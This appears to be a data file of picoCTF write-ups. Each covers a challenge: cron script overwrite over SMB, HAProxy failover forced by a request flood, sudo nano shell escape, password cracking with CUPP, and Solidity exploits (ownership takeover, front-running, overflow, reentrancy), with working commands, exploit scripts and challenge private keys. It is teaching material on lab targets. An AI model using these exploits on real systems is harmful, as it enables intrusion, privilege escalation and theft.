shares          Disk      Public Share With Guests
secure-shares   Disk      Printer for internal usage only
IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
\`\`\`

Important finding:

- \`shares\` is public
- \`secure-shares\` is the protected target

## Step 3: Inspect the public share

List files inside \`shares\`:

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'ls'
\`\`\`

Result:

\`\`\`text
script.sh
cron.log
\`\`\`

This matches the hint exactly:

- \`script.sh\` is likely the debug script
- \`cron.log\` probably stores the output from the minute-based cron job

## Step 4: Download the script and the log

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get script.sh'
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
\`\`\`

Read them:

\`\`\`bash
cat script.sh
cat cron.log
\`\`\`

Contents:

\`\`\`bash
#!/bin/bash
# this script runs every minute
echo "Health Check: $(date)"
\`\`\`

And the log looked like:

\`\`\`text
Health Check: Wed Mar 11 10:37:01 UTC 2026
Health Check: Wed Mar 11 10:38:01 UTC 2026
\`\`\`

This proves:

- the script is actually being executed
- its output is being written into \`cron.log\`

## Step 5: Check whether the public share is writable

If we can overwrite \`script.sh\`, we can turn cron into a file-reading primitive.

Test write access:

\`\`\`bash
printf 'test-write\\n' > /tmp/printer3_test.txt
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_test.txt test-write.txt; ls'
\`\`\`

Result:

- upload succeeded
- the file appeared in the share

That is the key vulnerability:

- anonymous users can modify a script that a privileged scheduled task runs

## Step 6: First-stage payload to discover the private path

Before directly reading the flag, use a small reconnaissance script:

\`\`\`bash
cat > /tmp/printer3_probe.sh <<'EOF'
#!/bin/bash
id
pwd
find / -maxdepth 4 -name flag.txt 2>/dev/null
EOF
\`\`\`

Upload it over the existing \`script.sh\`:

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_probe.sh script.sh'
\`\`\`

Then wait a bit more than one minute and pull the log again:

\`\`\`bash
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
cat cron.log
\`\`\`

New log output:

\`\`\`text
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
/challenge/shares
/challenge/secure-shares/flag.txt
\`\`\`

This tells us:

- the cron job runs as the \`challenge\` user
- it executes from \`/challenge/shares\`
- the private flag file is at \`/challenge/secure-shares/flag.txt\`

## Step 7: Second-stage payload to print the flag

Now replace the script with a direct \`cat\`:

\`\`\`bash
cat > /tmp/printer3_flag.sh <<'EOF'
#!/bin/bash
cat /challenge/secure-shares/flag.txt
EOF
\`\`\`

Upload it:

\`\`\`bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_flag.sh script.sh'
\`\`\`

Wait for the next cron execution:

\`\`\`bash
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
tail -n 20 cron.log
\`\`\`

The flag appeared in the public log:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

This is a classic insecure scheduled-task / writable-script issue.

The intended private directory was protected from direct anonymous browsing, but that protection failed because:

1. the public share was writable
2. a cron job executed a script from that writable location
3. the cron output was written back into a public log file

That gave us an indirect path:

- overwrite script
- wait for cron
- read output from log

So the “private” share was effectively readable through the public one.

## Minimal solve path

\`\`\`bash
nc -vz dolphin-cove.picoctf.net 56098
smbclient -N -L //dolphin-cove.picoctf.net/ -p 56098
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'ls'
printf '#!/bin/bash\\ncat /challenge/secure-shares/flag.txt\\n' > /tmp/script.sh
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/script.sh script.sh'
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
cat cron.log
\`\`\`

## Takeaway

Protecting a directory is meaningless if a scheduled task with access to that directory executes attacker-controlled code from a writable location. The real vulnerability here is not the private share itself, but the trust boundary broken by the cron-executed debug script.
`,
  },
  {
    id: "failure-failure",
    title: "Failure Failure",
    excerpt: "picoCTF Failure Failure writeup exploiting HAProxy failover behavior by exhausting rate limits to trigger backend routing to the flag server.",
    category: "picoCTF - General Skills",
    content: `# Failure Failure

## Challenge

**Category:** General Skills  
**Name:** Failure Failure

**Prompt:**

> Welcome to Failure Failure — a high-available system.
> This challenge simulates a real-world failover scenario where one server is prioritized over the other.
> A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand.
> You can begin your journey here to try and retrieve the flag.
>
> For reference:
> The HAProxy configuration used in this challenge is available here.
> The application code is available here

## Goal

Force the load balancer off the primary server and onto the backup server, because the backup server is the one that contains the flag.

## Step 1: Read the application code

The provided Flask app:

\`\`\`python
from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

load_dotenv()

app = Flask(__name__)

def global_rate_limit_key():
    return "global"

limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
\`\`\`

Important details:

1. The rate limit is **global**
2. The key function always returns \`"global"\`
3. So every request counts against the same bucket
4. When the limit is exceeded, the app returns \`503\`
5. The flag is shown only when \`IS_BACKUP=yes\`

That means:

- the primary server likely returns \`"No flag in this service"\`
- the backup server likely returns the real flag

## Step 2: Read the HAProxy configuration

Provided config:

\`\`\`haproxy
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
\`\`\`

Important details:

1. \`s1\` is the normal primary backend
2. \`s2\` is marked \`backup\`
3. HAProxy health-checks \`/\`
4. HAProxy expects HTTP status \`200\`
5. If a backend starts returning non-\`200\`, it can be marked down

This is the full intended path:

- flood the primary
- trigger its global limit
- it starts returning \`503\`
- HAProxy health checks fail
- HAProxy marks \`s1\` down
- traffic fails over to backup \`s2\`
- \`s2\` returns the flag

## Step 3: Confirm normal behavior

Request the page normally:

\`\`\`bash
curl -i -s http://mysterious-sea.picoctf.net:53064/
\`\`\`

Observed response body:

\`\`\`html
<p>No flag in this service</p>
\`\`\`

So the live traffic was initially going to the primary.

## Step 4: Trigger failover by exhausting the primary

The rate limit is \`300 per minute\`, so send more than that quickly.

A fast concurrent burst worked:

\`\`\`bash
seq 1 360 | xargs -n1 -P60 -I{} curl -s -o /dev/null http://mysterious-sea.picoctf.net:53064/
sleep 5
curl -s http://mysterious-sea.picoctf.net:53064/
\`\`\`

What this does:

- \`seq 1 360\` generates 360 requests
- \`xargs -P60\` runs many requests in parallel
- \`curl -s -o /dev/null\` sends the traffic without printing page bodies
- \`sleep 5\` gives HAProxy a moment to register health-check failures
- the final \`curl\` fetches the page after failover

## Step 5: Read the flag from the backup server

After the burst, the final request returned:

\`\`\`html
<p>picoCTF{<redacted>}</p>
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

This is an availability-design bug:

- the app uses a global rate limit
- HAProxy health-checks the exact same route
- health checks require status \`200\`
- the limit exhaustion makes the primary look unhealthy

So normal user traffic can influence load balancer health state.

The mistake is that:

- the primary and backup expose different data
- and the balancer’s failover condition is externally triggerable

That lets an attacker force routing to the backup.

## Minimal solve path

\`\`\`bash
curl -s http://mysterious-sea.picoctf.net:53064/
seq 1 360 | xargs -n1 -P60 -I{} curl -s -o /dev/null http://mysterious-sea.picoctf.net:53064/
sleep 5
curl -s http://mysterious-sea.picoctf.net:53064/
\`\`\`

## Takeaway

Health-check endpoints should not share fragile state with user traffic, especially not global rate limits. If production routing decisions depend on a route that attackers can intentionally degrade, failover can become an access-control bypass.
`,
  },
  {
    id: "absolute-nano",
    title: "ABSOLUTE NANO",
    excerpt: "picoCTF Absolute Nano writeup using GTFOBins nano technique with sudo privileges to escalate access and read the flag file.",
    category: "picoCTF - General Skills",
    content: `# ABSOLUTE NANO

## Challenge

**Category:** General Skills  
**Name:** ABSOLUTE NANO

**Prompt summary:**

- SSH access is provided
- hint: "What can you do with nano?"

## Goal

Use the allowed \`nano\` capability to escalate privileges or read the protected flag.

## Initial access

Connect with SSH:

\`\`\`bash
ssh -p 55799 ctf-player@crystal-peak.picoctf.net
\`\`\`

Password:

\`\`\`text
46cb0c29
\`\`\`

## Step 1: Inspect the environment

Once connected, basic recon showed:

\`\`\`bash
ls -la
id
sudo -l
\`\`\`

Important findings:

\`\`\`text
-r--r----- 1 root root 35 ... flag.txt
\`\`\`

So \`flag.txt\` exists in the home directory but is only readable by \`root\`.

The key \`sudo\` rule was:

\`\`\`text
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
\`\`\`

That means:

- we cannot run arbitrary \`sudo\`
- but we *can* run \`nano\` as root on \`/etc/sudoers\`

This is enough, because \`nano\` has multiple GTFOBins-style escape and file-access features.

## Relevant nano techniques

The useful \`nano\` techniques here are:

### 1. Execute a command from inside nano

Inside \`nano\`:

\`\`\`text
^R^X
\`\`\`

Then enter a shell command.

This is the most reliable route for this challenge because \`nano\` is running as \`root\` via \`sudo\`.

### 2. Spawn a shell from inside nano

Also from GTFOBins:

\`\`\`text
^R^X
reset; sh 1>&0 2>&0
\`\`\`

This can produce a root shell when terminal behavior cooperates.

### 3. Use spell checker hooks

If \`SPELL\` or \`-s\` is controllable, \`nano\` can be turned into a shell launcher through spell-check execution.

That technique is valid in general, but it was not necessary here.

### 4. Read arbitrary files

Since \`nano\` is running as root, it can also read protected files into the editor buffer.

Again, valid, but less convenient over a remote interactive TTY than just executing a root command.

## Chosen path

The cleanest solve was:

1. run \`sudo /bin/nano /etc/sudoers\`
2. use \`^R^X\`
3. execute a root command that copies the protected flag to a readable file
4. reconnect and read the copied file normally

## Step 2: Start root nano

Because some terminals cause issues with \`nano\`, set a simple terminal type first:

\`\`\`bash
export TERM=xterm
sudo /bin/nano /etc/sudoers
\`\`\`

## Step 3: Use nano's execute-command feature

Inside \`nano\`, press:

\`\`\`text
Ctrl-R
Ctrl-X
\`\`\`

That opens the \`Command to execute:\` prompt.

At that prompt, run:

\`\`\`bash
cp /home/ctf-player/flag.txt /home/ctf-player/flag_copy.txt; chmod 644 /home/ctf-player/flag_copy.txt
\`\`\`

Why this works:

- \`nano\` is running as \`root\`
- the command therefore runs as \`root\`
- it copies the protected file
- then makes the copy world-readable

This avoids relying on a fully interactive root shell.

## Step 4: Read the copied flag

After the root command succeeds:

\`\`\`bash
cat /home/ctf-player/flag_copy.txt
\`\`\`

Output:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why this works

The challenge is about treating \`nano\` as more than a text editor.

Granting:

\`\`\`text
sudo /bin/nano /etc/sudoers
\`\`\`

is effectively dangerous because \`nano\` is not a passive editor. It can:

- read arbitrary files
- execute commands
- sometimes spawn shells

So the sudo rule accidentally grants root-level actions even though it appears restricted.

## Minimal solve path

\`\`\`bash
ssh -p 55799 ctf-player@crystal-peak.picoctf.net
export TERM=xterm
sudo /bin/nano /etc/sudoers
\`\`\`

Inside \`nano\`:

\`\`\`text
Ctrl-R
Ctrl-X
\`\`\`

Command:

\`\`\`bash
cp /home/ctf-player/flag.txt /home/ctf-player/flag_copy.txt; chmod 644 /home/ctf-player/flag_copy.txt
\`\`\`

Back in the shell:

\`\`\`bash
cat /home/ctf-player/flag_copy.txt
\`\`\`

## Takeaway

Allowing editors under \`sudo\` is often equivalent to allowing command execution. \`nano\`, \`vi\`, \`vim\`, \`less\`, and similar programs can frequently be abused for shell escape, file read, or privilege escalation.
`,
  },
  {
    id: "bytemancy-2",
    title: "bytemancy 2",
    excerpt: "picoCTF Bytemancy 2 writeup sending raw bytes to a network service using pwntools to satisfy binary protocol requirements and retrieve the flag.",
    category: "picoCTF - General Skills",
    content: `# bytemancy 2

## Challenge

**Category:** General Skills  
**Name:** bytemancy 2

**Prompt summary:**

- source code provided as \`app.py\`
- connect with:

\`\`\`bash
nc lonely-island.picoctf.net 57958
\`\`\`

- hint:

> There's no way to print these bytes  
> Use pwntools to send raw bytes over the network

## Goal

Send the exact raw byte sequence the server expects and get the flag.

## Step 1: Read the source

The provided source is:

\`\`\`python
import sys

while(True):
  try:
    print('Send me the HEX BYTE 0xFF 3 times, side-by-side, no space.')
    print('==> ', end='', flush=True)
    user_input = sys.stdin.buffer.readline().rstrip(b"\\n")
    if user_input == b"\\xff\\xff\\xff":
      print(open("./flag.txt", "r").read())
      break
    else:
      print("That wasn't it. I got: " + str(user_input))
  except Exception as e:
    print(e)
    break
\`\`\`

The important line is:

\`\`\`python
if user_input == b"\\xff\\xff\\xff":
\`\`\`

So the service expects exactly:

\`\`\`text
\\xff\\xff\\xff
\`\`\`

which is three raw bytes with hexadecimal value \`FF\`.

## Why normal typing does not work

If you type:

\`\`\`text
fff
\`\`\`

or:

\`\`\`text
\\xff\\xff\\xff
\`\`\`

that sends ASCII characters, not raw byte \`0xFF\`.

The server reads from:

\`\`\`python
sys.stdin.buffer
\`\`\`

so it is comparing binary data, not text.

## Step 2: Use pwntools to send raw bytes

The simplest solve is:

\`\`\`python
from pwn import remote

io = remote('lonely-island.picoctf.net', 57958)
io.recvuntil(b'==> ')
io.send(b'\\xff\\xff\\xff\\n')
print(io.recvall(timeout=3).decode('latin1', 'replace'))
\`\`\`

### Explanation

- \`remote(...)\` connects to the service
- \`recvuntil(b'==> ')\` waits for the prompt
- \`send(b'\\xff\\xff\\xff\\n')\` sends the three required bytes and then a newline
- the server strips the newline with \`.rstrip(b"\\n")\`
- the remaining bytes are exactly \`b"\\xff\\xff\\xff"\`

## Step 3: Get the flag

Running the script returned:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Minimal solve

\`\`\`python
from pwn import remote

io = remote('lonely-island.picoctf.net', 57958)
io.recvuntil(b'==> ')
io.send(b'\\xff\\xff\\xff\\n')
print(io.recvall().decode())
\`\`\`

## Takeaway

When a challenge compares against a Python bytes literal like:

\`\`\`python
b"\\xff\\xff\\xff"
\`\`\`

you must send raw bytes, not printable text. \`pwntools\` makes this easy because \`send()\` accepts exact byte strings.
`,
  },
  {
    id: "password-profiler",
    title: "Password Profiler Writeup",
    excerpt: "picoCTF Password Profiler writeup using CUPP to generate a custom wordlist from OSINT data and cracking a SHA-1 hash to recover the password.",
    category: "picoCTF - General Skills",
    content: `# Password Profiler Writeup

Recovered password: \`Aj_15901990\`
Flag format from checker: \`picoCTF{<redacted>}\`

## Files
- \`userinfo.txt\`
- \`hash.txt\`
- \`check_password.py\`

## Goal
Use OSINT details from \`userinfo.txt\` to build a custom password list, then crack the SHA-1 hash in \`hash.txt\` with the provided checker.

## Source Data
\`\`\`text
First Name: Alice
Surname: Johnson
Nickname: AJ
Birthdate: 15-07-1990
Partner's Name: Bob
Child's Name: Charlie
\`\`\`

Target SHA-1:
\`\`\`text
968c2349040273dd57dc4be7e238c5ac200ceac5
\`\`\`

## Tool Used
- \`cupp\`
- \`python3\`

## Solve Steps

1. Generate a custom wordlist with CUPP.
\`\`\`bash
cd /home/kali/Downloads
cupp -i -q
\`\`\`

2. Feed the victim profile into CUPP.
\`\`\`text
First Name: Alice
Surname: Johnson
Nickname: AJ
Birthdate (DDMMYYYY): 15071990
Partners name: Bob
Partners nickname:
Partners birthdate (DDMMYYYY):
Childs name: Charlie
Childs nickname:
Childs birthdate (DDMMYYYY):
Pets name:
Company name:
Add keywords?: n
Add special chars?: y
Add random numbers?: y
Leet mode?: y
\`\`\`

3. CUPP writes the generated dictionary to \`alice.txt\`.
\`\`\`text
Saving dictionary to alice.txt, counting 17352 words.
\`\`\`

4. Copy that output to the filename expected by the checker and run the checker.
\`\`\`bash
cp alice.txt passwords.txt
python3 check_password.py
\`\`\`

## Result
\`\`\`text
Password found: picoCTF{<redacted>}
\`\`\`

## Why it Worked
- CUPP combines names, nickname, birthdate fragments, separators, random suffixes, and leetspeak variations.
- One of those generated combinations was \`Aj_15901990\`.
- The checker computes \`sha1(password)\` for each candidate in \`passwords.txt\` until it matches the target hash.

## Verification
You can verify directly in Python:
\`\`\`bash
python3 - <<'PY'
import hashlib
print(hashlib.sha1(b"Aj_15901990").hexdigest())
PY
\`\`\`

Expected output:
\`\`\`text
968c2349040273dd57dc4be7e238c5ac200ceac5
\`\`\`
`,
  },
  {
    id: "access-control",
    title: "Access_Control Writeup",
    excerpt: "picoCTF Access Control writeup exploiting an unprotected owner-setter function in a Solidity smart contract to claim ownership and reveal the flag.",
    category: "picoCTF - Blockchain",
    content: `# Access_Control Writeup

Flag: picoCTF{<redacted>}

Tools used
- \`curl\`
- \`rg\`
- \`node\`
- \`npm install ethers@6\`
- \`ethers\` (installed under \`/tmp/node_modules\`)

Endpoints
- Web app: \`http://lonely-island.picoctf.net:52648/\`
- RPC: \`http://lonely-island.picoctf.net:62620\`
- Contract: \`0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9\`
- Player: \`0xECd115dC14231719f96d08c648476F3128F49C81\`

Recon commands
\`\`\`bash
curl -L http://lonely-island.picoctf.net:52648/
curl -L http://lonely-island.picoctf.net:52648/status
curl -s -X POST http://lonely-island.picoctf.net:62620 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
curl -s -X POST http://lonely-island.picoctf.net:62620 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","latest"],"id":1}'
\`\`\`

Dependency setup
\`\`\`bash
cd /tmp
npm install ethers@6
\`\`\`

Exploit summary
- The deployed bytecode exposed an unprotected owner-setting function at selector \`0xa6f9dae1\`.
- After setting \`owner\` to the player address, an owner-only function at selector \`0x890d6908\` marked the challenge solved.
- The flag was then readable via selector \`0xf9633930\`.

Exploit script
\`\`\`bash
node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');
const rpc = 'http://lonely-island.picoctf.net:62620';
const pk = '0xc3eeb0fddf58a623f9036b6e6d15a2111018cf938ff42a1bb09af4af87a314a5';
const contract = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9';
const player = '0xECd115dC14231719f96d08c648476F3128F49C81';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);

  const tx1 = await wallet.sendTransaction({
    to: contract,
    data: '0xa6f9dae1' + player.toLowerCase().slice(2).padStart(64, '0')
  });
  await tx1.wait();

  const tx2 = await wallet.sendTransaction({
    to: contract,
    data: '0x890d6908'
  });
  await tx2.wait();

  const flagData = await provider.call({ to: contract, data: '0xf9633930' });
  const [flag] = ethers.AbiCoder.defaultAbiCoder().decode(['string'], flagData);
  console.log(flag);
})();
NODE
\`\`\`

Verification
\`\`\`bash
curl -s http://lonely-island.picoctf.net:52648/status
\`\`\`
`,
  },
  {
    id: "front-running",
    title: "Front_Running Writeup",
    excerpt: "picoCTF Front Running writeup monitoring the mempool for pending transactions, extracting the plaintext solution, and front-running with higher gas price.",
    category: "picoCTF - Blockchain",
    content: `# Front_Running Writeup

Flag: picoCTF{<redacted>}

Tools used
- \`curl\`
- \`node\`
- \`npm install ethers@6\`
- \`ethers\` (installed under \`/tmp/node_modules\`)
- \`4byte.directory\` for selector lookup

Endpoints
- Web app: \`http://candy-mountain.picoctf.net:57899/\`
- RPC: \`http://candy-mountain.picoctf.net:50495\`
- Contract: \`0x5FbDB2315678afecb367f032d93F642f64180aa3\`
- Attacker address: \`0x471e0887aa4A667841758a7A6283616798e7cfB5\`

Useful recon
\`\`\`bash
curl -L http://candy-mountain.picoctf.net:57899/
curl -s http://candy-mountain.picoctf.net:57899/status
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x5FbDB2315678afecb367f032d93F642f64180aa3","latest"],"id":1}'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0x76fe1e92'
\`\`\`

Mempool monitoring
\`\`\`bash
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_pendingTransactions","params":[],"id":1}'
\`\`\`

Victim pending transaction observed
\`\`\`text
from: 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
to:   0x5FbDB2315678afecb367f032d93F642f64180aa3
gasPrice: 0x3b9aca00 (1 gwei)
input: 0x76fe1e92000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000177069636f4354467b6d336d7030306c5f7031723474337d000000000000000000
decoded string: \`picoCTF{<redacted>}\`
\`\`\`

Exploit idea
- The contract exposes \`solve(string)\` and checks \`keccak256(input)\` against a fixed target hash.
- The victim bot leaked the correct preimage in plaintext calldata while using only \`1 gwei\` gas price.
- Sending the exact same calldata from the attacker account with a higher gas price causes the miner to include the attacker transaction first.

Exploit script
\`\`\`bash
cd /tmp
npm install ethers@6

node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');
const rpc = 'http://candy-mountain.picoctf.net:50495';
const pk = '0xa75e3cc6962770a9a7be58a9a01a4d594f2ce2d3d68dcc360c6d6550d22e8bfd';
const contract = '0x5FbDB2315678afecb367f032d93F642f64180aa3';
const data = '0x76fe1e92000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000177069636f4354467b6d336d7030306c5f7031723474337d000000000000000000';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);

  const tx = await wallet.sendTransaction({
    to: contract,
    data,
    gasLimit: 150000n,
    gasPrice: ethers.parseUnits('3', 'gwei'),
    nonce: await provider.getTransactionCount(wallet.address, 'pending')
  });

  await tx.wait();

  const flagData = await provider.call({ to: contract, data: '0xf9633930' });
  const [flag] = ethers.AbiCoder.defaultAbiCoder().decode(['string'], flagData);
  console.log(flag);
})();
NODE
\`\`\`

Verification
\`\`\`bash
curl -s http://candy-mountain.picoctf.net:57899/status
\`\`\`
`,
  },
  {
    id: "smart-overflow",
    title: "Smart_Overflow Writeup",
    excerpt: "picoCTF Smart Overflow writeup triggering a uint256 integer overflow in unchecked Solidity arithmetic to satisfy the flag reveal condition.",
    category: "picoCTF - Blockchain",
    content: `# Smart_Overflow Writeup

Flag: picoCTF{<redacted>}

Tools used
- \`curl\`
- \`node\`
- \`npm install ethers@6\`
- \`ethers\` (installed under \`/tmp/node_modules\`)
- \`4byte.directory\` for selector lookup

Endpoints
- Web app: \`http://mysterious-sea.picoctf.net:59216/\`
- RPC: \`http://mysterious-sea.picoctf.net:57602\`
- Contract: \`0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9\`
- Player address: \`0x051d3aD8Cae52E640e7D66405f6Ee6558377d0fa\`

Recon
\`\`\`bash
curl -L http://mysterious-sea.picoctf.net:59216/
curl -s http://mysterious-sea.picoctf.net:59216/status
curl -s -X POST http://mysterious-sea.picoctf.net:57602 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9","data":"0x27e235e3000000000000000000000000051d3ad8cae52e640e7d66405f6ee6558377d0fa"},"latest"],"id":1}'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0xb6b55f25'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0x27e235e3'
\`\`\`

Bug
- \`deposit(uint256 amount)\` increases the internal balance using unchecked pre-0.8 Solidity arithmetic.
- The challenge reveals the flag if a deposit causes \`balances[msg.sender]\` to become smaller than it was before.
- Because the function does not require any matching \`msg.value\`, the attack is purely arithmetic.

Exploit idea
- Start from \`balances[player] == 0\`.
- Call \`deposit(1)\` so the internal balance becomes \`1\`.
- Call \`deposit(type(uint256).max)\`, which computes \`1 + (2^256 - 1) == 0\` modulo \`2^256\`.
- The new balance is smaller than the old one, so the contract sets \`revealed = true\`.

Exploit script
\`\`\`bash
cd /tmp
npm install ethers@6

node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');

const rpc = 'http://mysterious-sea.picoctf.net:57602';
const pk = '0x16841d4639affd5e6ea7a599911fc38d8aaffd7408a19567406eb5dc28d60b80';
const contract = '0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);
  const iface = new ethers.Interface([
    'function deposit(uint256 amount)',
    'function getFlag() view returns (string)'
  ]);

  let tx = await wallet.sendTransaction({
    to: contract,
    data: iface.encodeFunctionData('deposit', [1n])
  });
  await tx.wait();

  tx = await wallet.sendTransaction({
    to: contract,
    data: iface.encodeFunctionData('deposit', [ethers.MaxUint256])
  });
  await tx.wait();

  const flagData = await provider.call({
    to: contract,
    data: iface.encodeFunctionData('getFlag', [])
  });
  const [flag] = iface.decodeFunctionResult('getFlag', flagData);
  console.log(flag);
})();
NODE
\`\`\`

Verification
\`\`\`bash
curl -s http://mysterious-sea.picoctf.net:59216/status
\`\`\`
`,
  },
  {
    id: "reentrance",
    title: "Reentrance Writeup",
    excerpt: "picoCTF Reentrance writeup deploying an attacker contract to exploit the classic reentrancy vulnerability and drain the bank contract to zero.",
    category: "picoCTF - Blockchain",
    content: `# Reentrance Writeup

Flag: picoCTF{<redacted>}

## Summary

This challenge is a classic reentrancy bug.

The vulnerable bank sends Ether to the caller before it updates the caller's internal balance. If the caller is a contract, its \`receive()\` function runs as soon as the Ether arrives. That callback can immediately call \`withdraw()\` again while the bank still believes the original balance is intact.

Because the challenge reveals the flag when the bank's on-chain balance reaches \`0\`, the exploit is to:

1. Deploy an attacker contract.
2. Deposit a small amount into the bank from that contract.
3. Call \`withdraw()\` once.
4. Re-enter \`withdraw()\` repeatedly from \`receive()\` until the bank is fully drained.

## Challenge Details

- Web UI: \`http://crystal-peak.picoctf.net:53465/\`
- RPC: \`http://crystal-peak.picoctf.net:52781\`
- Target bank: \`0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF\`
- Player address: \`0x68146Ba96F4aCaE3eD690cfd78C2CafA6B4b041C\`
- Player private key: \`0x47e7fe6e77a8ce43619e9e1c8414d4991633c3b8c6745a435ecadc0b53382691\`
- Bank starting balance: \`10 ETH\`
- Player starting balance: \`5 ETH\`

## Tools Used

- \`curl\`
- \`node\`
- \`npm install ethers\`
- \`npm install solc\`
- \`ethers\` from \`/tmp/node_modules\`
- raw JSON-RPC calls for code and balance checks

## Recon

### Pull the challenge page and status

\`\`\`bash
curl -L http://crystal-peak.picoctf.net:53465/
curl -s http://crystal-peak.picoctf.net:53465/status
\`\`\`

### Read the deployed bytecode

\`\`\`bash
curl -s -X POST http://crystal-peak.picoctf.net:52781 \\
  -H 'Content-Type: application/json' \\
  --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF","latest"],"id":1}'
\`\`\`

### Check the bank's ETH balance

\`\`\`bash
curl -s -X POST http://crystal-peak.picoctf.net:52781 \\
  -H 'Content-Type: application/json' \\
  --data '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF","latest"],"id":1}'
\`\`\`

The bank started with:

\`\`\`text
0x8ac7230489e80000 = 10 ETH
\`\`\`

## Vulnerability Analysis

The critical logic in \`withdraw(uint256)\` is effectively:

\`\`\`solidity
require(amount <= balances[msg.sender], "Insufficient funds available");

(bool ok,) = msg.sender.call{value: amount}("");
require(ok, "Transfer failed");

balances[msg.sender] -= amount;
\`\`\`

That ordering is the bug.

### Why it is vulnerable

- The bank checks the balance first.
- Then it sends Ether to \`msg.sender\`.
- If \`msg.sender\` is a contract, that contract's \`receive()\` function runs immediately.
- At that moment, the bank has not reduced \`balances[msg.sender]\` yet.
- So the attacker contract can call \`withdraw(amount)\` again and pass the same balance check repeatedly.

This is the textbook reentrancy pattern: interaction before state update.

### Flag condition

The contract reveals the flag when the bank contract's own ETH balance hits zero.

That means the attack goal is not just “steal some Ether,” but “drain all Ether from the bank.”

## Exploit Strategy

Use an attacker contract with three parts:

1. \`attack()\` deposits \`1 ETH\` into the bank and immediately starts the first withdrawal.
2. \`receive()\` runs whenever the bank sends Ether back.
3. Inside \`receive()\`, if the bank still has at least \`1 ETH\`, call \`withdraw(1 ether)\` again.

### Why 1 ETH works

- The bank started with \`10 ETH\`.
- The attacker contract first deposits \`1 ETH\`, so the bank temporarily holds \`11 ETH\`.
- The attacker contract's internal bank balance is \`1 ETH\`.
- Because the bank only updates that internal balance after the external call returns, each nested withdrawal still sees \`balances[attacker] == 1 ether\`.
- Re-entering \`11\` times drains the full bank balance to \`0\`.

## Attacker Contract

\`\`\`solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.12 <0.9.0;

interface IVulBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}

contract ReentranceAttacker {
    IVulBank public bank;
    address payable public owner;
    uint256 public amount;

